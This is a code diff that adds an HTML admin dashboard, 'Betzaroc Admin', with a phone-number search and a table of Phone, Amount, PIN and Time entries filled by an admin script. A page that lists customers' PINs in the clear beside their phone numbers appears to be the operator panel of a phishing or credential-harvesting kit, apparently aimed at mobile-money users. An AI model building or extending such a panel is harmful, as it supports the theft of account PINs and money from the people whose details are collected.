@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Betzaroc Admin</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body class="admin-body">
+  <header class="admin-head">
+    <div>
+      <div class="brand small">BETZAROC</div>
+      <h1>Admin Dashboard</h1>
+    </div>
+    <div class="admin-tools">
+      <input id="search" type="search" inputmode="numeric" placeholder="Search phone">
+      <button type="button" id="refresh">Refresh</button>
+      <span id="meta">Loading...</span>
+    </div>
+  </header>
+  <table>
+    <thead>
+      <tr>
+        <th>Phone</th>
+        <th>Amount</th>
+        <th>PIN</th>
+        <th>Time</th>
+      </tr>
+    </thead>
+    <tbody id="tableBody"></tbody>
+  </table>
+  <script src="/admin.js"></script>
+</body>
+</html>
